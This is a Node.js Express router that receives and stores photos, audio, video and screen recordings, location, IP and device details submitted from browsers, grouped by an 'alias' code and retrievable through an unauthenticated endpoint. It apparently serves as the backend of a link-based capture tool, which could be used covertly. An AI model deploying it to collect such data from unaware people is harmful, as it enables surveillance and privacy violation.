const router = require('express').Router();
const multer = require('multer');
const fs = require('fs');
const { client, insertData } = require('./db');

const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'uploads/');
    },
    filename: function (req, file, cb) {
        cb(null, file.fieldname + '-' + Date.now() + '.webm');
    }
});
const upload = multer({ storage: storage });



router.post('/take-photo', async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, img, alias, ip, iptype, devicebrand, devicename, devicetype, searchname, searchtype, searchversion, ostype, osname } = req.body;
        const imagePath = `${Date.now()}.${Math.round(
            Math.random() * 1e9
        )}.png`;
        const buffer = Buffer.from(img.replace(/^data:image\/(png|jpg|jpeg);base64,/, ''), 'base64');
        fs.writeFile(`uploads/${imagePath}`, buffer, function (err) {
            if (!err) {
                console.log("file is created")
            }
        });
        const filepath = `uploads/${imagePath}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'take photo',
            duration: 0,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname
        }
        console.log(data);
        insertData(data);
        res.send({ message: "File Saved" });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
})


router.post('/take-snap', async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, img, alias, ip, iptype, devicebrand, devicename, devicetype, searchname, searchtype, searchversion, ostype, osname } = req.body;
        const imagePath = `${Date.now()}.${Math.round(
            Math.random() * 1e9
        )}.png`;
        const buffer = Buffer.from(img.replace(/^data:image\/(png|jpg|jpeg);base64,/, ''), 'base64');
        fs.writeFile(`uploads/${imagePath}`, buffer, function (err) {
            if (!err) {
                console.log("file is created")
            }
        });
        const filepath = `uploads/${imagePath}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'take snap',
            duration: 0,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname
        }
        console.log(data);
        insertData(data);
        res.send({ message: "File Saved" });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
})


router.post('/audio', upload.single('audio'), async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, duration, alias, ip, iptype, devicebrand, devicename, devicetype, searchname, searchtype, searchversion, ostype, osname } = req.body;
        const filepath = `${req.file.path}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'audio recording',
            duration: duration,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname
        }
        console.log(data);
        insertData(data);
        res.send({ message: "File Saved" });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/videowith', upload.single('videowith'), async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, duration, alias, ip, iptype, devicebrand, devicename, devicetype, searchname, searchtype, searchversion, ostype, osname } = req.body;
        const filepath = `${req.file.path}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'video with audio recording',
            duration: duration,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname
        }
        console.log(data);
        insertData(data);
        res.send({ message: "File Saved" });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/videowithout', upload.single('videowithout'), async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, duration, alias, ip, iptype, devicebrand, devicename, devicetype, searchname, searchtype, searchversion, ostype, osname } = req.body;
        const filepath = `${req.file.path}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'video without audio recording',
            duration: duration,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname
        }
        console.log(data);
        insertData(data);
        res.send({ message: "File Saved" });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/screenwithout', upload.single('screenwithout'), async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, duration, alias, ip, iptype, devicebrand, devicename, devicetype, searchname, searchtype, searchversion, ostype, osname } = req.body;
        const filepath = `${req.file.path}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'screen without audio recording',
            duration: duration,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname
        }
        console.log(data);
        insertData(data);
        res.send({ message: "File Saved" });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/screenwith', upload.single('screenwith'), async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, duration, alias, ip, iptype, devicebrand, devicename, devicetype, searchname, searchtype, searchversion, ostype, osname } = req.body;
        const filepath = `${req.file.path}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'screen with audio recording',
            duration: duration,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname
        }
        console.log(data);
        insertData(data);
        res.send({ message: "File Saved" });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/geo-snap', async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, altitude, alias, ip, iptype, devicebrand, devicename, devicetype, searchname, searchtype, searchversion, ostype, osname } = req.body;
        const data = {
            alias: alias,
            filename: filename,
            filetype: 'geo-snap',
            filepath: null,
            duration: 0,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname
        }
        console.log(data);
        insertData(data);
        res.send({ message: "File Saved" });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/aliasdata', async (req, res) => {
    try {
        const { alias } = req.body;
        const selectQuery = 'SELECT * FROM files WHERE alias = ?';
        client.execute(selectQuery, [alias])
            .then(result => {
                const rows = result.rows;
                console.log('Data:');
                // rows.forEach(row => {
                //     console.log(row);
                // });
                res.send({ message: `your aliascode ${alias} files`, rows });
            });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});

module.exports = router